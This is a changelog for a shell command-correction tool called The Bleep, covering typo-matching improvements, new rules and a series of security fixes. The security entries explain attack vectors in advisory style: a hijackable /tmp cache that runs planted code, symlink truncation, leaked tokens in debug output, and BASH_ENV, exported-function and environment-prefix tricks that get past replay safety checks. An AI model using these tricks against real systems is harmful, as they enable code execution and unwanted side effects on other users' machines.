# Changelog

## 4.0.4 — unreleased

### Added

- **Structured suggestions include conservative risk metadata.** API consumers
  can see explicit privilege, destructive-command, bypass and side-effect
  markers before deciding how to present a correction.

- **Recent failure history** — `thebleep --pick` lists the last five failed
  commands, `thebleep --pick 2` corrects one from its bounded local record
  without replaying it, and `thebleep --forget 2` removes one.

- **Explicit local learning** — accepted one-word corrections can be promoted
  with `thebleep --learn-last`, listed with `thebleep --learned`, and removed
  with `thebleep --forget-learning`.

- **Inline correction** — Bash, Zsh and Fish can bind <kbd>Esc Esc</kbd> to
  place a command-only correction in the current line without running it.

- **`bun_script_not_found`** — `bun run buidl` -> `bun run build`, and
  `bun instal` -> `bun install`. bun reports an unknown word as a missing
  *script* whether or not `run` was typed, and offers no suggestion of its own:

  ```
  $ bun instal
  error: Script not found "instal"
  ```

  So the candidates come from the project's `package.json` -- found by walking
  up from the current directory, which is what bun does -- and, when `run` was
  not typed, from bun's own commands as `bun --help` lists them. Nothing is
  offered after `bun run` except a script, because `bun run install` is not
  `bun install`; it is another missing script.

  Thanks to [@TrixSec](https://github.com/TrixSec) for pointing at the
  ecosystem ([#6](https://github.com/stamparm/thebleep/pull/6)).

### Security

- **Dispatcher listings are bounded and conservative.** A listing that exceeds
  the output limit is not treated as complete, so replay never infers that a
  subcommand is harmless from a truncated answer.

- **Rule-pack deserialization is bounded.** An oversized compiled rule cache is
  rejected before its contents are handed to the marshal parser.

- **Shell-logger responses are bounded.** An oversized or incomplete socket
  response is discarded before JSON parsing.

- **Explicit paths to dispatchers are no longer probed automatically.** A file
  named `git` or `cargo` can be an arbitrary executable, so it now requires
  replay confirmation like any other explicit path.

- **Cache deserialization is bounded.** Oversized cache files are rejected
  before their contents are handed to the marshal parser.

- **Failure history is bounded and terminal-safe.** Oversized records are not
  stored or loaded, and `--pick` escapes control characters and line breaks
  before displaying commands and paths.

- **Learned corrections are written privately.** The local learning store is
  created with mode `0600` and its temporary file cannot follow a symlink on
  platforms that support `O_NOFOLLOW`.

- **Cache files are written and read privately.** The compiled rule pack and
  other local caches now use exclusive `0600` temporary files and refuse
  symlinked cache paths where the platform supports `O_NOFOLLOW`.

- **Learned state is read privately.** Learned corrections now refuse symlinked
  state files where the platform supports `O_NOFOLLOW`, matching their secure
  writer.

### Fixed

- **`--why` now recognises DNS resolution failures.** A captured curl error
  such as `Could not resolve host: example.invalid` is explained with the
  hostname and a quoted, read-only lookup for the current platform.

- **`--why` suggested Linux-only checks on Windows.** Deterministic follow-up
  commands now match the target platform, including PowerShell clock and
  filesystem checks and a Windows-compatible port lookup.

- **A disappearing command could crash correction.** If an executable vanished
  between the safe lookup and the replay launch, The Bleep now treats that as
  unavailable output and continues without a traceback.

- **A program's colour hid its message from every rule that reads one.** Rules
  read output as text, and nothing took the terminal control sequences out
  first. deno is a clap program, so `clap_suggestion` -- which corrects any
  clap tool from clap's own wording, without knowing the tool's name -- should
  have covered it from the day it was written. What arrived was

  ```
  \x1b[0m\x1b[1m\x1b[31merror\x1b[0m: unrecognized subcommand 'runn'
  ```

  with a reset sequence between `error` and its colon, so the rule looking for
  `error: unrecognized subcommand` found nothing and `deno runn` had no
  correction while `ruff chekc` had one. deno honours `NO_COLOR` but never asks
  whether anything is watching, so that is what a rule got every time.

  Output now comes through `utils.without_control_sequences` on its way out of
  whichever reader produced it -- one place, so no reader and no rule needs to
  know. `\r`, `\n` and `\t` are left alone: they are the shape of the text, not
  decoration, and rules split on them.

- **`thebleep --version` printed a warning at people whose shell it did not
  recognise.** 4.0.3 added a word when a shell's version probe answers nothing,
  because for a real shell that means one that is not there or will not start.
  `Generic` is the driver for a shell nothing recognised: it has no program to
  ask and no version to fail to get, so it answered nothing by design and got
  complained at for it.

  ```
  $ thebleep --version
  [WARN] Could not determine Generic Shell version
  The Bleep 4.0.3 using Python 3.12.13 and Generic Shell
  ```

  Nothing had failed, and `--doctor` already reports an unrecognised shell as a
  problem, with advice, which is where that belongs. Corrections were never
  affected. `Generic._get_version` now answers `None` -- "there is no version to
  ask for" -- which is a different thing from a real driver's empty answer, and
  `tests/shells/test_generic.py` holds every driver to saying nothing when it has
  nothing to complain about.

## 4.0.3 — 2026-08-21

### Security

- **Exit status 127 authorised running your command again.** 126 and 127 are
  what a shell reports for `cannot execute` and `command not found`, and this
  read them as proof that nothing had happened -- so the previous command could
  be run a second time without asking. They are a *convention* the shell follows
  for its own failures, and nothing stops a program from exiting with either.
  The ones that do are exactly the ones that had already done something:

  ```bash
  $ make install                # a recipe's command was missing, four recipes
  make: cc: No such file        # having already run
  make: *** [install] Error 127
  $ bleep
  make install                  # run again, unasked
  ```

  `npm run`, `sh -c` and anything else that reports its child's status do the
  same. The shortcut is gone; the `PATH` lookup beside it was always the sound
  version of the same idea, and [Safe by
  default](README.md#safe-by-default) still describes the three cases that skip
  the question.
- **An empty `PATH` entry made a local program look absent.** `PATH=:/usr/bin`
  searches the current directory first -- that is what an empty component means
  on POSIX, and `shutil.which` honours it. This skipped it, and the replay gate
  reads "not on `PATH`" as "there is nothing there to run, so running it again
  is free". So a `./deploy` the shell had just found and run was run a second
  time without being asked about. `tests/test_utils.py` now holds the lookup to
  agreeing with `shutil.which` across five `PATH` shapes.
- **The cache directory in `/tmp` could run somebody else's code as you.** With
  no home directory to expand `~` against -- a service account, a cron job, a
  stripped container -- caches fell back to
  `/tmp/thebleep-cache-<user>`, created with whatever the umask allowed and
  never checked. What goes in there is the compiled rule pack, which the next
  correction `marshal.loads`es and `exec`s, and the filename is worked out from
  two public constants. So whoever created that directory first, with a pack of
  their own in it, ran code as you. It is created `0700` now, and one that
  exists and belongs to somebody else is refused rather than used.
- **The first-run tracker was a predictable name in a shared `/tmp`**, opened
  `'w'` -- so a symlink planted there beforehand was followed and whatever it
  pointed at was truncated. It lives under your own cache directory now, opened
  with `O_NOFOLLOW` and mode `0600`, which is what its sibling in the instant
  logger had always done.
- **Debug output named the values of your `env` setting**, which is where people
  keep tokens -- and `.github/ISSUE_TEMPLATE.md` asks for debug output to be
  pasted into a bug report. Both places that printed it log the names only now:
  the environment a replayed command is given, and the settings dump at the top
  of every `--debug` run. The template also says to read what you paste --
  `--doctor` is the output written to be safe to paste, and debug output is a
  copy of what happened and cannot be.
- **Every GitHub Action is pinned to a commit**, the publishing one especially:
  its job holds `id-token: write`, and a tag can be moved. `build` and `twine`
  are pinned too, so two builds of the same tag use the same toolchain.

### Added

- **A clone runs itself, with nothing installed.** The alias is shell code that
  calls The Bleep again, and it called it by the one name an installed copy has:
  `thebleep`, whatever that turns out to be on your `PATH`. A checkout had no
  way to say otherwise, so `python -m thebleep --alias` from a clone printed an
  alias pointing at the release you installed months ago -- you could work on
  4.0.3 all day and have 4.0.0 correcting your commands, with nothing anywhere
  to tell you. That is not a thing an installer should have to fix.

  Run it as the package and the alias names the interpreter and the checkout it
  came from, so the clone is the whole installation:

  ```bash
  eval "$(python3 ~/src/thebleep/thebleep/__main__.py --alias-loader)"
  ```

  One line in a startup file, works from any directory, no `PYTHONPATH`, and
  `git pull` is the upgrade. The interpreter named there needs `psutil` and
  `pyte`, which is the whole of the setup. `thebleep --alias` still says `thebleep`, so
  nothing about an installed copy changed. `THEBLEEP_COMMAND` overrides what
  goes into the alias, for a wrapper of your own or a shell whose quoting is not
  the quoting used here. `python -m thebleep` against a copy in `site-packages`
  keeps the ordinary answer -- there is no clone there to prefer.
- **`install.sh --dev`** installs a checkout *editable*, with whichever of `uv`,
  `pipx` or `pip` it finds, for when you would rather have `thebleep` on your
  `PATH` for real. Installing a checkout without it copies the files once, and
  the copy is stale by the next commit.

- **It corrects tools it has never heard of.** Until now the model was one rule
  per program, written after somebody noticed the program existed, and then left
  to rot when its wording changed -- seven such rules were found dead in a single
  afternoon. But the tools do not each invent their own way of saying it. They
  use a handful of argument parsers, and those print what they think you meant in
  shapes that do not vary:

  ```
  ruff chekc .          error: unrecognized subcommand 'chekc'
                          tip: a similar subcommand exists: 'check'

  gh reop list          unknown command "reop" for "gh"
                        Did you mean this?  repo

  black --chekc .       Error: No such option '--chekc'. (Did you mean one of:
                        '--check', ...)
  ```

  So there are now three rules that read the *parser* rather than the program --
  `clap_suggestion` for Rust tools, `cobra_suggestion` for Go tools and
  `click_suggestion` for Python ones -- and every program built with one is
  corrected without a line being written for it. `ruff`, `gh`, `helm` and `black`
  have no rules of their own and all four are corrected; so will whatever is
  released next year.

  Each is gated on a literal from its parser's wording, so the rule pack skips
  all three for a correction that cannot involve them.

  Three hand-written rules retire into them -- `cargo_no_command`,
  `uv_unknown_subcommand` and `kubectl_unknown_command` -- so the count is
  unchanged at 176 while the coverage is not. Their cases were added to the new
  rules' tests before the old rules were deleted, and one bug went with them:
  `cargo_no_command` took the mistyped word from the second position on the
  command line rather than from cargo's message, so `cargo --offline instal`
  was beyond it.
- **Mistyped options are corrected, not just subcommands** -- and for every
  program, not only the ones with a parser this recognises. `ls --colour`
  becomes `ls --color`, `git status --shrot` becomes `git status --short`,
  `tar --extrat` becomes `tar --extract`, `curl --verbse` becomes
  `curl --verbose`, `du --humn-readable` becomes `du --human-readable`,
  `ruff check --fixx` becomes `ruff check --fix`.

  Nothing did any of this before. The only rule that fired on a mistyped flag
  was `long_form_help`, which answered `ls --help` -- a help screen dressed as a
  correction, with the rest of your command discarded.

  `option_typo` reads the options out of the program's own usage when it printed
  them, which is what git does, so nothing is run. When the program printed only
  an invitation -- `Try 'ls --help' for more information.` -- it accepts the
  invitation and reads that. Without one, nothing is run: taking a program up on
  its own suggestion is a different thing from assuming some unknown program's
  `--help` is harmless. `long_form_help` still answers when there is no option
  close enough to offer, so `ls --zzzzzzqqq` is unchanged.

### Changed

- **`utils.replace_value`** replaces an option's value whether it was written
  `--sort name` or `--sort=name`. `replace_argument` looks for a whitespace-
  delimited word and cannot see the second, so it handed the script back
  unchanged and the suggestion was dropped as identical to the command -- two
  rules had each grown their own copy of the workaround.
- **A command is replayed in the shell it failed in.** Running it again went
  through `Popen(shell=True)`, which is the *platform's* shell -- `/bin/sh`, dash
  on Debian and Ubuntu -- whatever shell you had typed it in. So a bash-ism came
  back as an `sh` error and the correction was for a problem you never had:

  ```bash
  $ [[ -f /nope ]]                # bash: exits 1, prints nothing
  $ bleep
  /bin/sh: 1: [[: not found       # a different error entirely
  ```

  fish and zsh syntax the same, and PowerShell through `cmd.exe` is a total
  mismatch. Each shell now says how to run one of its own command lines. A POSIX
  shell on Windows is Git Bash or WSL, with its own `PATH` and its own
  `/usr/bin`, so there the replay stays on the platform's shell -- starting the
  other one reproduces a different machine.
- **`no_command` costs half what it did.** An unknown command is the commonest
  way a command fails, and this scanned every name on `PATH` twice -- once to
  decide whether to fire, once to work out the answer -- then made a third pass
  recomputing distances the second one had just produced. 187ms to 93ms across
  five typos on the machine in `bench/results`.
- **A huge shell history is read from the end.** `no_command` asks for history
  to break a tie on what you have actually run, and the whole file was read and
  decoded to look at the last ten entries. 34ms to 3.7ms on a 12MB history.
- **Twenty rules that never look at the output say so.** `requires_output`
  defaults to true, so each was switched off whenever the output was
  unavailable -- which is every correction where re-running your command was
  declined, and exactly when a rule that needs only the command is the one thing
  that could have helped.
- **A quarter of the word means a quarter.** `matching.max_distance` said
  "roughly a quarter" and then allowed 3 edits for anything longer than eight
  characters, which for a nine-letter word is a third: in a container with no
  systemd, `systemctl statu ssh` was answered with `sysctl statu ssh`.
- **The transport is scrubbed by name, not by `TB_` prefix.** Your own
  `TB_ANYTHING` reached the replayed command again; `TB_` is short enough to
  belong to a build system or an in-house tool, and deleting a stranger's
  variable makes the command behave differently the second time for a reason
  nobody could find.
- **<kbd>ctrl+p</kbd> goes back and <kbd>ctrl+n</kbd> goes forward**, which is
  what they do in every shell's own history. They were the other way round.
- **The hit rate in the README is reproducible.** It was measuring the machine:
  `apt_get` asks Debian's `command-not-found` database what provides `sl`, so the
  commit that recorded 80/80 scores 76/80 on a machine that has that database,
  with no code in between. The benchmark hides it, and the recording is now
  tracked so CI checks the README against it rather than skipping.
- **`whomi` no longer suggests `which`.** The question the whole tool exists to
  answer -- what did you mean -- had no module and no test. It was three utility
  functions inherited unexamined from The Fuck, and underneath them
  `difflib.SequenceMatcher`, which measures how similar two sequences are and
  was being asked how someone mistypes. Those are not the same thing:

      difflib ratio    gti/git 0.667    gti/tic 0.667    gti/gtk 0.667

  A four-way tie, decided by whichever order `PATH` happened to be read in --
  which is how `gti status` came to suggest `tic status`, the terminfo compiler.
  `git` earned no credit for being one *swap* away, because a common-subsequence
  measure has no idea what a transposition is.

  There is now a `thebleep.matching` module that owns the question, built on
  Damerau-Levenshtein distance, where a transposition costs one edit. The same
  comparison becomes `git` 1, `tic` 2, and the tie is gone. Anything further away
  than roughly a quarter of the word is not offered at all, which is what stops
  `wgte` reaching `getent` and `ping` reaching `pinky` -- a confident wrong
  answer being worse than none.

  Two further faults in the same path:

  - **Your history was an override rather than a hint.** The nearest name from
    your shell history went first with no comparison against the best answer
    available. `whoami` is one edit from `whomi`; `which` is three, and won
    because it was in the history -- put there by somebody running `which bleep`
    while debugging this very tool. The idea is worth keeping, so it now breaks
    a tie: a name you have used wins when it is *as good* a match, never when it
    is worse.
  - **Shell builtins were not candidates at all.** Only `PATH` was searched, so
    `exti` could not reach `exit`, nor `cdd` reach `cd`, however obvious the
    slip.

  `pip nistall` is now decided by the same measure rather than by the margin
  between two `difflib` ratios, so the destructive-subcommand list and the tuning
  constant added earlier in this release are both gone: a transposition of
  `install` is one edit away and `uninstall` is two, in both directions.
- **`tests/corpus/`, and the reason it exists.** There were 3,713 tests and not
  one asked *"given this typo, is the first suggestion sane?"* Every rule was
  checked on its own against a hand-written fixture of its own tool's output,
  which cannot catch what a user meets -- the answer they see comes out of the
  shared matching helpers and the ordering across rules, and no rule owns
  either. That is how the suite stayed green while `whomi` suggested `which`.

  The corpus is ~80 real typos and the answer each should get first, with a real
  `PATH` listing and a fixed history so it gives one answer on every machine and
  on Windows. It runs with the suite, so a regression in suggestion quality now
  fails the build.

### Fixed

- **A safety proof about the command, authorising something larger than the
  command.** Three holes, all of the same shape, all reported by a third-party
  review and reproduced end to end before being fixed. `is_inert()` says
  "running this again cannot have an effect"; what actually runs is *a shell, its
  startup files, an inherited environment, and then the command*.

  - **An exported shell function.** The replay runs `bash -c <script>` in the
    shell the command was typed in, and bash imports functions from its
    environment -- so `which('deploy')` returning `None` stopped meaning there
    was nothing to run. A function that appended to a file and failed appended
    twice, unasked. It is asked about now; the function is deliberately *not*
    stripped from the replay environment, because the interactive shell had it
    and running it is what reproduces the failure faithfully.
  - **`BASH_ENV`.** A non-interactive bash sources whatever it names before the
    command it was given, so replaying a command that did not exist *at all*
    still had an effect. Opening the shell was the effect.
  - **An assignment in front of the command.** `PATH=/tmp/mine git satus` had
    the dispatcher probe asking `/usr/bin/git` whether it has a `satus`, and
    using the answer to authorise re-running `/tmp/mine/git`, which is a
    different program with different subcommands and a side effect.
    `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.deploy ... git deploy` is the
    same shape without swapping anything: those variables make `git --list-cmds`
    list `deploy`, and the probe runs without them. Any assignment in front of a
    command now costs a question -- the alternative is keeping a list of the
    variables that can change how a program resolves or behaves, which is
    exactly the sort of supposedly-complete list this module refuses to keep.
- **`xxd` is not read-only.** It takes an output file as its second operand, and
  `xxd -r patch.hex target` patches a file in place, which is what its own manual
  page demonstrates. It was on the list of commands that only ever read.
- **A path is not the program its name usually means.** `READ_ONLY` is a
  judgement about the program conventionally called `ls`; `./ls` is a file the
  user has specifically said to execute, and its name says nothing about what it
  does. One written for the occasion re-ran itself and doubled its side effect.
  A path costs a question now, `/bin/ls` included -- there is no test that tells
  `/bin/ls` from `./ls` without trusting the thing in question.
- **The helper output cap bounded nothing.** `tool_lines` sliced to 4MB *after*
  `communicate()` had already accumulated everything, so a helper that printed
  two gigabytes had already cost two gigabytes. It reads into the same bounded
  tail the replay uses; 100MB through the pipe now costs 256KB of peak memory.
- **Six more programs started without a timeout**, four named by the review and
  two found by the test written to refuse the next one: `git_branch_delete_checked_out`,
  `specific/archlinux`, `specific/brew`, `option_typo`, `git_hook_bypass` and
  `pip_unknown_command`. `tests/test_every_rule.py` now fails the build if
  anything under `thebleep/rules` or `thebleep/specific` calls `Popen`,
  `check_output`, `check_call` or `subprocess.run` directly.
- **`git commit` that *failed* was answered with `git reset HEAD~`.** The rule
  fired on any failed command containing `commit`, and every failed commit is a
  commit that has not happened -- so what it offered to throw away was the one
  before it. A failed hook, unmerged files or a stale index lock each left the
  previous commit one keystroke from gone. It now wants the commit to have
  worked, which is the moment it exists for.
- **`ln -s /etc/hostname /tmp/link` offered a symlink on top of
  `/etc/hostname`.** The rule moved the first argument that exists on disk to
  the end; when both exist that is the source. The command was written correctly
  and only wanted `-f`.
- **Twenty rules could hang for as long as the program they asked did.** `lsof`
  against a wedged NFS mount, `docker` against a dead daemon, `gradle` waiting
  on a daemon of its own -- none of them had a timeout, and a rule that raises
  is caught while a rule that never returns is The Bleep frozen at your prompt.
  Several also piped stderr and read only stdout, which deadlocks on a program
  chatty enough to fill that pipe. One helper now, with the timeout, the size
  cap and the `/dev/null` stderr in it -- and `fish -ic` and `tcsh -ic`, which
  read your config and run on the hot path of every correction in those shells,
  go through it too.
- **Replay output had no ceiling.** The timeout bounds how long a command has to
  print, not how much: a failed build can put hundreds of megabytes through the
  pipe in three seconds, and all of it was held in memory and then decoded into a
  second copy. The last 8MB is kept.
- **`THEBLEEP_REPEAT=false` turned repeat mode on.** It was missing from the list
  of settings read as booleans, so the string `false` was stored, and any
  non-empty string is true. The booleans are read off the defaults now, so one
  added later cannot be forgotten.
- **Nowhere to write a config was fatal.** `XDG_CONFIG_HOME` pointing at a file,
  a read-only home, a container mount: creating the config directory happened
  outside the error handling, so it was a traceback out of the middle of every
  correction and every `--alias` -- which is a shell that cannot start. Defaults
  are a complete answer; writing them down is a convenience.
- **A stale shell-logger socket ended every correction.** A daemon that exited
  and left its socket file behind gave `ConnectionRefusedError`; one that
  accepted and said nothing blocked forever. It is a reader like the others now:
  no answer means fall through to the next one. It also stopped at the first
  non-matching command, so correcting anything but the newest logged one
  silently switched off every rule that needs output.
- **A recording shorter than 1MB killed instant mode**, or the process: an empty
  file raised an uncaught `ValueError` and a partially written one raised
  `SIGBUS`. As much of it as there is, is mapped.
- **`--shell-logger` was unreachable through the alias.** The alias exports
  `TB_HISTORY`, and the correction branch was tested first -- so from any shell
  with the alias loaded, `bleep --shell-logger session.log` ran a correction
  instead, and with `require_confirmation` off it *executed* one.
- **A checkout at a path with a space produced a broken alias**, silently, for
  every POSIX shell: the quoting around the path closed the single-quoted alias
  body early. POSIX can spell an embedded quote, so it now does. tcsh cannot, so
  tcsh keeps its warning and its fallback.
- **`grep '??' notes` was not the command any rule saw.** `split_command` used
  `??` as its stand-in for an escaped space while `shlex` did the splitting, and
  `??` is two characters anybody can type.
- **A rule that returns something that is not a command costs that rule.** A
  custom rule with a path through it that returns `None` -- a regex that matched
  in `match` and did not here, the commonest mistake there is -- reached the
  display as `None.strip()` and took the whole CLI with it.
- **<kbd>ctrl+c</kbd> at a prompt on Windows raised a traceback.**
  `msvcrt.getwch` is documented to raise `KeyboardInterrupt`, which nothing
  caught. It aborts, the way it does on POSIX.
- **A process that exits while its tree is being killed is not an error.** Only
  `AccessDenied` was caught, so the ordinary way a timeout comes apart produced
  a traceback instead of "no output".
- **`FOO=1 gradle build` got the three-second timeout.** `slow_commands` was
  matched against the first word, and the command was two lines above; `sudo
  gradle`, `nice gradle` and `/usr/bin/gradle` missed it too. So the setting
  that exists to give a slow command longer gave it nothing, and it timed out
  with no output to correct from.
- **The shell-logger session reported success when it failed.** `waitpid`
  returns an encoded status, so a child that exited 1 gave 256, and
  `sys.exit(256)` exits *zero*.
- **`ls --sort=nmae` was answered with `ls --help`.** GNU prints the value it
  refused and every value it accepts; the last line of that was matched, the
  rest of the command thrown away, and a help screen offered as a correction.
- **`mkdir -p x && rmdir y` was answered with `mkdir -p -p x && rmdir y`.** `No
  such file or directory` is a message half the tools on the machine print, and
  the `mkdir` in that command had worked.
- **`ls-la` was answered with `lsblk`, and `gitstatus` with `aa-status`** -- with
  `ls -la` and `git status` one row below, behind an answer nobody would want. A
  missing space is one edit, and it was losing to three-edit neighbours.
- **`sudo apt-get updte` on a machine without sudo was answered with `su do
  apt-get updte`.** `su` is a prefix of `sudo`, so the rule split a real command
  name it had never heard of; `git k` for `gitk` and `pip x` for `pipx` are the
  same slip.
- **`diff --colour=alwys a b` was answered with `diff --color a b`**, silently
  dropping the value and suggesting a different command.
- **An option correction could be offered twice**, where a name reached the
  ranking from both the printed usage and `--help`.
- **`apt instal vim` gets a correction again.** apt 3.0 -- Debian trixie,
  Ubuntu 25.04 and newer -- prints `Error: Invalid operation instal` where
  apt-get prints `E: Invalid operation instal`, and only apt-get's wording was
  matched. So `apt-get instal vim` worked and `apt` -- the one everybody
  actually types -- got nothing at all.
- **`man nosuchpage` no longer suggests `nosuchpage --help`.** With no manual
  page the rule offered `<last argument> --help`, which is a good answer for
  `man ls` on a machine with no man pages and not a command at all for a name
  that does not exist. Shell builtins still count, so `man read` is still
  answered with `read --help`.
- **`ls -la` in an empty directory no longer suggests `ls -A -la`.** `ls_all`
  only checked that the output was empty, so a command that had already asked
  for hidden files was told to ask again.
- **Instant mode gave up on any command too long for the terminal.** A command
  wider than the screen is echoed across several rows, and the recording keeps
  those rows as separate lines -- so looking for every word of the command in
  *one* line found nothing, and instant mode fell back to asking whether it
  could re-run your command, which is the one thing it exists to avoid. At
  eighty columns that was every command over about seventy-five characters, and
  `pip install -r requirements-dev.txt --extra-index-url ...` is not an unusual
  thing to type. The rows are rejoined now, recognised by the terminal having
  filled one completely.
- **Instant mode no longer tracebacks on a command it cannot parse.** The
  reader called `shlex.split` unguarded, so an unbalanced quote -- or a `#`
  comment, which bash allows by default -- put a `ValueError` traceback on the
  screen in place of a correction. `rerun.py` has carried the guard for this
  since 4.0.0, with a comment saying why: an unbalanced quote is exactly the
  sort of thing somebody asks to have fixed. The other reader has it now too.
- **Three rules that fired on whatever the output happened to be.** Each one
  answered a command it had no business answering, and between them they covered
  every failing `git commit`, `git diff` and `git push`.
  - `git_hook_bypass` matched any `git am`, `commit` or `push` and did not even
    need to see what went wrong, so **declining to re-run your command was
    answered with `--no-verify`** -- it was the only rule left that could match.
    The suggestion is a lie (no hook ran, none failed) and it is the one with
    consequences: somebody who said "no, do not re-run my command" and then
    pressed enter had skipped their own pre-commit checks. It now needs the
    output, needs an executable hook for that subcommand to actually exist --
    wherever `core.hooksPath` puts them -- and sits after the rules that know
    what the error really was, because git prints nothing of its own when a hook
    fails and there is no marker to be sure of.
  - `git_commit_amend` matched `'commit' in script_parts` and nothing else, so a
    commit that failed inside an unresolved merge was answered with
    `git commit --amend` -- where `git add` is the answer -- and the typed
    message was thrown away. It now wants the commit to have *succeeded*, which
    is the moment it is actually for, and puts `--amend` into the command rather
    than replacing it, so `git commit -m "wip"` keeps its message.
  - `git_diff_staged` matched any `git diff` without `--staged`, so
    `git diff README.md --cached` -- which fails because the flag is in the
    wrong place -- was answered with `git diff --staged README.md --cached`,
    failing identically and leaving `git_flag_after_filename`, which gets it
    right, behind it. It too now wants the previous command to have succeeded,
    which is the case it is for: a `git diff` that printed nothing because
    everything is staged.
- **tcsh's `--alias-loader` has never worked, and now does.** It printed a stub
  that calls itself once it has replaced itself -- which is what a loader is
  everywhere else. tcsh expands an alias when it *parses* the line, so the
  self-reference was expanded before the `eval` meant to redefine it had run,
  and tcsh answered `Alias loop.` Every time, for as long as that line was in
  the `.cshrc`, and it was the documented way to install for tcsh.

  There is no way to write the stub that avoids it, because the loop *is* the
  self-reference and the self-reference is the point. So the flag gives tcsh the
  real alias, which works. What tcsh gives up is the loader's one advantage: the
  body goes into the startup file rather than being generated fresh, so after an
  upgrade that changes the body the line has to be regenerated.
- **Nushell can run the corrections it is given.** Three of the commonest --
  `cd` into a directory that does not exist, `touch` a file in one, `cp` into
  one -- all emitted `mkdir -p`, and Nushell's `mkdir` is its own command with
  no such flag: `The \`mkdir\` command doesn't have flag \`-p\``. The suggestion
  did not parse, and in the one shell where the user has to press return
  themselves, so they got to watch it fail. Nushell's `mkdir` creates parents
  unconditionally, so the flag simply goes. There is a test that no rule
  hard-codes it again.
- **Ctrl+C at the replay question no longer prints a traceback.** `get_key`
  returns a sentinel object rather than a string for Ctrl+C, Escape and the
  arrows, and the question called `.lower()` on it -- so the obvious way to say
  "no, leave it alone" answered with `AttributeError: '_GenConst' object has no
  attribute 'lower'`. The test for this handed it the *string* `'\x03'`, so it
  agreed with a contract the real function does not have; it uses the real
  values now.
- **The first correction in a shell no longer thinks your command worked.**
  Introduced by the exit-status check in this same release, and only through the
  loader -- which is the documented way to install, so it is the way most people
  would have met it. The stub is:

  ```bash
  bleep() {
      eval "$(TB_SHELL=bash thebleep --alias bleep)";
      bleep "$@";
  }
  ```

  That `eval` is a command of its own, so it replaces `$?` before the real alias
  -- whose first act is to read `$?` -- ever sees it. The status was therefore
  the `eval`'s zero, a command that had just failed looked like one that had
  succeeded, and `bleep` answered `No bleeps given`. The second time in the same
  shell it worked, because by then the stub had replaced itself. A failure that
  happens once per shell and never again is a maddening thing to report.

  The stub saves `$?` first and hands it over, and the alias prefers what it was
  handed. Reproduced in bash, zsh and fish through the loader, fixed in all
  three, and there is a test that the stub passes it on.
- **A command that worked is no longer run again.** Nothing consulted the exit
  status of the command being corrected, so `bleep` after a *success* offered to
  re-run it -- and then corrected whatever the second run happened to say. The
  clearest case: `git tag v9` succeeds silently; run it again and it says
  `already exists`; the suggestion was `git tag --force v9`, moving a tag that
  was already right, from output the user never saw. `git deploy` (an alias for
  a deploy script), `echo x >> log` and every other non-idempotent command were
  exposed the same way.

  The alias now hands over `$?` as its very first act, before reading the
  history or the alias list replaces it, and a command that exited 0 is not
  re-run and not asked about -- there is nothing to gain by asking. This is
  checked *after* the existing "can this have an effect" test, on purpose: `ls`
  that printed nothing also exited 0, and is still re-read and still offered
  `ls -A`.

  Two statuses go the other way. 127 (`command not found`) and 126 (`cannot
  execute`) mean the command never ran, so re-running it is certain to do
  nothing -- and the shell's own answer covers an alias, a shell function and a
  `PATH` that has changed since, none of which a name lookup sees.

  bash, zsh and fish report it. tcsh, Nushell and PowerShell do not yet, and
  there the behaviour is exactly what it was; so it is for anyone whose startup
  file still has an alias from an earlier release.
- **Answering the replay question `y` and then Enter no longer means "no".**
  A keypress was read as "up to six bytes, whatever is there", so a key with
  something behind it swallowed the lot: `y⏎` -- which is how everybody answers
  a `[y/N]` prompt -- arrived as `y\r`, and `y\r` is not `y`. The prompt that
  guards whether your previous command runs a second time was reading the
  opposite of the answer given, and saying `no` back while it did it. An arrow
  key with an Enter behind it was dropped the same way, with no redraw and
  nothing to show it had happened.

  A key is one byte now, and more only while the key is genuinely unfinished --
  an escape sequence, or a character outside ASCII. What is left in the buffer
  is not lost: the Enter after the `y` is read by the next prompt, which is
  where somebody typing `y⏎` wanted it to go. Confirmed through a real terminal
  in both directions.
- **`git branch -d master` no longer deletes `main`.** One keypress, a branch
  nobody had named, gone. Two faults stacked. `git_branch_delete_checked_out`
  matched `error: Cannot delete branch 'x' checked out at`, which is what git
  2.45 and older printed; 2.46 renamed it to `cannot delete branch 'x' used by
  worktree at`, so on any current git the rule went dead. With it dead
  `git_main_master` answered the error instead -- and that rule fired on any git
  output containing `'master'` and rewrote the command by plain string
  substitution, so the suggestion was `git branch -d main`.

  Both are fixed: the first accepts either wording, and the second now requires
  git to have said the name is one it does *not* have (`did not match any
  file(s)`, `branch 'x' not found`, `not something we can merge`, `invalid
  upstream`). An error about a branch that exists is no longer a reason to
  rename it, and the substitution is by word rather than by substring, so
  `release/master-fix` is left alone.
- **`cp a.txt dir/a.txt` no longer makes a *directory* called `a.txt`.**
  `cp_create_destination` ran `mkdir -p` on the whole destination, filename
  included, so the copy landed inside a directory named after the file it should
  have been -- and the command exited 0, so nothing said otherwise. It also
  fired when the missing thing was the *source*, where there is nothing to make:
  `mv typoo.txt newname.txt` suggested `mkdir -p newname.txt && mv ...`, which
  failed and left the directory behind. It now reads which path the message
  names -- `cannot create` and `cannot move ... to` name the destination,
  `cannot stat` names the source -- and makes the directory holding it. GNU and
  busybox wordings both captured; busybox `mv` is left alone because it says the
  same thing whichever path is missing.
- **`pip nistall requests` no longer offers only `pip uninstall requests`.**
  pip names one candidate and that was taken on trust, so a transposed
  `install` was answered with the command that removes the package -- the only
  suggestion, with nothing to arrow down to, and only pip's own prompt in the
  way. Sorting by closeness does not help: `difflib` scores `nistall` nearer to
  `uninstall` (0.875) than to `install` (0.857). What it does show is that every
  genuine typo is decided by a tenth or more and only the ambiguous one is
  close, so a near tie is now enough to demote the reading that removes things.
  `pip unistall` still means `uninstall`. The other candidates come from pip
  itself, read out of the table pip dispatches on.
- **`npm` suggestions that could not run, and one that ran the wrong thing.**
  `npm urgrade` produced the literal suggestion `npm None` -- npm 7 and later
  print no command list, so there was nothing to match against and `None` was
  pasted into the command. `npm build` produced `npm run`, because only the
  first word of npm's own multi-word suggestion was read. And `npm run strat`
  produced `npm run watch`: the script list left out every lifecycle script, so
  `start` was never a candidate, and the 0.1 closeness floor accepted whatever
  remained. npm's suggestion and the project's scripts now go into one pool
  ordered by closeness, and the lifecycle scripts are in it.
- **`sudo make install` no longer suggests `sudo sudo make install`.** Rules are
  offered the command with its wrapper peeled off as well as whole, which is how
  `ls` behind a `sudo` gets `sudo ls -lah`. But the `sudo` rule itself was
  offered the peeled command too, answered `sudo make install`, and then had the
  peeled `sudo` put back in front. A rule named after the wrapper no longer runs
  on the command that wrapper came off.
